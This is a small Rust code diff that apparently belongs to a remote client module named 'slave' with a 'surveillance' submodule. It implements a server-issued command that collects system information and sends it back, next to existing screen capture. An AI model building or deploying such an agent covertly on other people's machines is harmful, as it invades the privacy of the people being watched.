@@ -1,4 +1,7 @@
-use crate::common::messages::{Command, Message, Response};
+use crate::{
+    common::messages::{Command, Message, Response},
+    slave::surveillance::sysinfo,
+};
 use futures_util::{SinkExt, StreamExt};
 use std::time::Duration;
 use tokio::time::sleep;
@@ -43,14 +46,13 @@ async fn connect_and_handle(url: &str) -> Result<(), Box<dyn std::error::Error>>
 async fn handle_command(command: Command) -> Response {
     match command {
         Command::CaptureScreens => {
-            // Implement screen capture logic here
             let screens = capture_screens();
             println!("captured screens, sending...");
             Response::Screens(screens)
         }
         Command::GetSystemInfo => {
-            // Implement system info retrieval logic here
-            Response::Status("System info retrieval not implemented".to_string())
+            println!("capturing system info");
+            Response::SystemInfo(sysinfo::get_system_info())
         }
     }
 }
